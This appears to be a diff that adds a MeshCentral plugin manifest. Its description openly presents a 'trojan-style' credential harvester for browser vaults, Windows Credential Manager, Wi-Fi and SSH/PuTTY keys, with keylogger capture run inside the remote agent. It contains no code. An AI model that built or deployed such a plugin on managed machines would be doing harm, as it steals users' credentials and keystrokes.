@@ -1,0 +1,18 @@
+{
+  "name": "MeshCentral Password Recovery",
+  "shortName": "mcpassrec",
+  "version": "0.1.0",
+  "author": "MeshCentral Password Recovery contributors",
+  "description": "Password Recovery tab: trojan-style credential harvest (browser vaults, Windows Credential Manager, Wi-Fi, SSH/PuTTY) plus keylogger capture, with a savable report. Recovery runs natively inside the MeshAgent.",
+  "hasAdminPanel": false,
+  "homepage": "https://github.com/og-debug447/mesh-pwrecovery",
+  "changelogUrl": "https://raw.githubusercontent.com/og-debug447/mesh-pwrecovery/main/CHANGELOG.md",
+  "configUrl": "https://raw.githubusercontent.com/og-debug447/mesh-pwrecovery/main/config.json",
+  "downloadUrl": "https://github.com/og-debug447/mesh-pwrecovery/archive/refs/heads/main.zip",
+  "repository": {
+    "type": "git",
+    "url": "https://github.com/og-debug447/mesh-pwrecovery.git"
+  },
+  "versionHistoryUrl": "https://api.github.com/repos/og-debug447/mesh-pwrecovery/tags",
+  "meshCentralCompat": ">=1.1.0"
+}
